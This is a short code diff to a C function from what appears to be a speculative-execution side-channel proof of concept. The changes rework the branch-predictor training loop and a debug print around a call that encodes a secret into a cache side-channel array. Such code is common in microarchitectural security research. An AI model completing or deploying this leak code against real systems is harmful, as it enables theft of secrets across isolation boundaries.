@@ -91,10 +91,14 @@ uint64_t transfer(bool (*leak_data)(uint32_t iteration, uint32_t *train_data, ui
     mfence();
 
     // training the predictor
-    for (uint32_t i = 0; i < (train_data_length * stride) - 1; i += stride)
+    if (train_data_length > 0)
     {
-        //training = leak_data(i, train_data, train_data_length * stride, in, side_channel, bits_count, stride);
-        //printf("Training: %d\n", training);
+        for (uint32_t i = 0; i < (train_data_length * stride) - 1; i += stride)
+        {
+            // using 0 as secret, so no adresses are loaded into cache
+            training = leak_data(i, train_data, train_data_length * stride, 0, side_channel, bits_count, stride);
+            //printf("Training: %d\n", training);
+        }
     }
 
     // flushing the transfer array, before encoding data into it
@@ -108,7 +112,7 @@ uint64_t transfer(bool (*leak_data)(uint32_t iteration, uint32_t *train_data, ui
     
     // writing secret into the side channel array
     training = leak_data((train_data_length * stride), train_data, train_data_length * stride, in, side_channel, bits_count, stride);
-    //printf("Training: %d\n", training);
+    printf("Training: %d\n", training);
 
     char binaryResult[bits_count + 1];
     memset(binaryResult, 0, bits_count + 1);
